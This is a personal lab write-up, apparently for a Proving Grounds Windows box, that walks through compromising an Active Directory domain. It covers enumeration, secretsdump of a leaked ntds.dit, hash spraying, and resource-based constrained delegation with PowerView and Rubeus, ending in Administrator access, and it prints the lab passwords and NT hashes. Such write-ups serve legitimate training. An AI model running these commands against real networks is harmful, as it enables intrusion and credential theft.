#GenericALL #secretsdump #rubeus #powerview #powermad
# NMAP 

```
sudo nmap -sC -sV 192.168.247.175 -oN nmap-resourced
```

![[PG/Windows/attachments/Pasted image 20250706010648.png]]

![[PG/Windows/attachments/Pasted image 20250706011022.png]]
# SMB 

![[PG/Windows/attachments/Pasted image 20250706010951.png]]

Nope
![[PG/Windows/attachments/Pasted image 20250706011409.png]]

# RPC 

```
rpcclient -U '' -N 192.168.247.175
```

This works 

![[PG/Windows/attachments/Pasted image 20250706011612.png]]

Save this to a file. 

Clean it up 

```
awk -F: '{ print $2 }' users.txt
```

![[PG/Windows/attachments/Pasted image 20250706012241.png]]
Then this 

```
:%s/.*\[\([^\]]*\)\].*/\1/g
```

![[PG/Windows/attachments/Pasted image 20250706012307.png]]

We got users :) 

![[PG/Windows/attachments/Pasted image 20250706012505.png]]


Looks like we got a password in the description for V.Ventz:HotelCalifornia194!

![[PG/Windows/attachments/Pasted image 20250706012854.png]]

These creds work with nxc and smb

```
nxc smb 192.168.247.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
```
![[PG/Windows/attachments/Pasted image 20250706013215.png]]
- found share we can read

Read the share 

```
smbclient -U V.Ventz //192.168.247.175/Password\ Audit/
```

![[PG/Windows/attachments/Pasted image 20250706013438.png]]
![[PG/Windows/attachments/Pasted image 20250706124158.png]]

![[PG/Windows/attachments/Pasted image 20250706124139.png]]
Found ntds.dit and SECURITY and SYSTEM registries...

# Impacket SecretsDump to Read 

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

![[PG/Windows/attachments/Pasted image 20250706013935.png]]

Got admin hash...

```
aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f
```


Noooo... it doesn't work 

![[PG/Windows/attachments/Pasted image 20250706014401.png]]

Extract hashes from secretsdump output 

```
cat hashes.txt| sed -En 's/^[^:]*:[^:]*:[^:]*:([^:]*):.*$/\1/p'
```

![[PG/Windows/attachments/Pasted image 20250706114152.png]]

Extract usernames from secretsdump output 

```
sed 's/:.*//' hashes.txt
```

![[PG/Windows/attachments/Pasted image 20250706114352.png]]

Okay tried to test every hash and none of them worked. Not entirely surprised. 

```
nxc smb 192.168.236.175 -u clean-users.txt -H clean-hashes.txt
```

![[PG/Windows/attachments/Pasted image 20250706114915.png]]

No WinRM for this user 

![[PG/Windows/attachments/Pasted image 20250706115101.png]]

Researching what ntds.jfm is ... it apparently logs transactions for the ntds.dit file and records changes. 


# with an NT hash (overpass-the-hash)  
```
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET  
```

```
impacket-getTGT -hashes 'aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f' resourced.local/Administrator@192.168.236.175
```
# with an AES (128 or 256 bits) key (pass-the-key)  
```
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
```


Oh sheiittt. WAIT The hash spray worked for winrm!!

```
nxc winrm 192.168.236.175 -u clean-users.txt -H clean-hashes.txt
```

![[PG/Windows/attachments/Pasted image 20250706123828.png]]

```
resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
```

# Evil-WinRM

```
evil-winrm -i 192.168.236.175 -H 19a3a7550ce8c505c2d46b5e39d6f808 -u L.Livingstone
```

PG box is taking a shit. Need to revert. 

![[PG/Windows/attachments/Pasted image 20250706124856.png]]
- yey

# Initial Access as L.Livingstone

![[PG/Windows/attachments/Pasted image 20250706124947.png]]
- no fun privileges boo

Proof

![[PG/Windows/attachments/Pasted image 20250706125044.png]]

Interesting directories 

![[PG/Windows/attachments/Pasted image 20250706125141.png]]
- Windows10Upgrade 
- Password Audit

Poking at Windows10Upgrade

![[PG/Windows/attachments/Pasted image 20250706125258.png]]
- maybe this 'resources' directory will be interesting (considering the name of the box)

Note to self...check file size before catting them out. 

![[PG/Windows/attachments/Pasted image 20250706125420.png]]

There's some local privilege escalation, but seems complicated.. going to upload winpeas and see what it finds.

# WinPEAS

![[PG/Windows/attachments/Pasted image 20250706130639.png]]

All access to this 

```
HKLM\system\controlset001\services\crypt32
```

![[PG/Windows/attachments/Pasted image 20250706131056.png]]

?
![[PG/Windows/attachments/Pasted image 20250706131253.png]]

Barely anything in winpeas.
# Sharphound maybe?

![[PG/Windows/attachments/Pasted image 20250706131450.png]]

Start bloodhound server 
```
cd ~/Tools/AD-Enumeration/New-Bloodhound-App; docker compose up -d
```

Upload data 

Go to Administration > File Ingest 

![[PG/Windows/attachments/Pasted image 20250706132410.png]]

![[PG/Windows/attachments/Pasted image 20250706132430.png]]

![[PG/Windows/attachments/Pasted image 20250706132510.png]]

Then go to Explore 

![[PG/Windows/attachments/Pasted image 20250706132538.png]]

Mark L.Livingstone as Owned 

![[PG/Windows/attachments/Pasted image 20250706132613.png]]

This dude has GenericAll over the DC 

![[PG/Windows/attachments/Pasted image 20250706132715.png]]

I should prob try this (again hint to resource-based)

![[PG/Windows/attachments/Pasted image 20250706132922.png]]
CTRL + C and Command + V from BloodHound worked. 
```
New-MachineAccount -MachineAccount cadet -Password $(ConvertTo-SecureString 'Password1!' -AsPlainText -Force)
```

![[PG/Windows/attachments/Pasted image 20250706141243.png]]

Use PowerView to retrieve SID for newly created machine account
```
$ComputerSid = Get-DomainComputer cadet -Properties objectsid | Select -Expand objectsid
```

![[PG/Windows/attachments/Pasted image 20250706141326.png]]

Build generic ACE with attacker computer + SID as principal & get binary bytes for new DACL/ACE
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![[PG/Windows/attachments/Pasted image 20250706141421.png]]

Then use PowerView to set this new security descriptor in msDS-AllowedToActOnBehalfOfOtherIdentity

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

![[PG/Windows/attachments/Pasted image 20250706141450.png]]

Then use Rubeus to hash plaintext password into RC4_HMAC

```
.\Rubeus.exe hash /password:Password1!
```

![[PG/Windows/attachments/Pasted image 20250706141532.png]]

FINALLY use Rubeus s4u module to get service ticket for service name we are pretending to be admin for.

```
.\Rubeus.exe s4u /user:cadet$ /rc4:7FACDC498ED1680C4FD1448319A8C04F /impersonateuser:Administrator /msdsspn:cifs/resourcedc.resourced.local /ptt
```

![[PG/Windows/attachments/Pasted image 20250706142618.png]]
![[PG/Windows/attachments/Pasted image 20250706142633.png]]

![[PG/Windows/attachments/Pasted image 20250706142648.png]]

Save the last ticket that is outputted.

Save this to tickt.kirbi and align left with `:%le`
![[PG/Windows/attachments/Pasted image 20250706141950.png]]

![[PG/Windows/attachments/Pasted image 20250706143455.png]]

Base64 decode and save as ticket.kirbi 
```
cat tickt.kirbi | base64 -d > ticket.kirbi
```

Then run impacket's ticket converter
```
impacket-ticketConverter ticket.kirbi ticket.ccache 
```

![[PG/Windows/attachments/Pasted image 20250706144033.png]]
Then export the .ccache
```
export KRB5CCNAME=ticket.ccache
```

Then use impacket's secrets dump to login as administrator
```
impacket-secretsdump -k -no-pass resourcedc.resourced.local
```


![[PG/Windows/attachments/Pasted image 20250706144528.png]]

![[PG/Windows/attachments/Pasted image 20250706144609.png]]

Use the hash under DRSUAPI method with psexec 

```
impacket-psexec Administrator@192.168.236.175 -hashes aad3b435b51404eeaad3b435b51404ee:8e0efd059433841f73d171c69afdda7c
```
![[PG/Windows/attachments/Pasted image 20250706144646.png]]

WOOOOOHOOOOOOO

![[PG/Windows/attachments/Pasted image 20250706144725.png]]

![[PG/Windows/attachments/Pasted image 20250706144825.png]]

![[PG/Windows/attachments/Pasted image 20250706144843.png]]
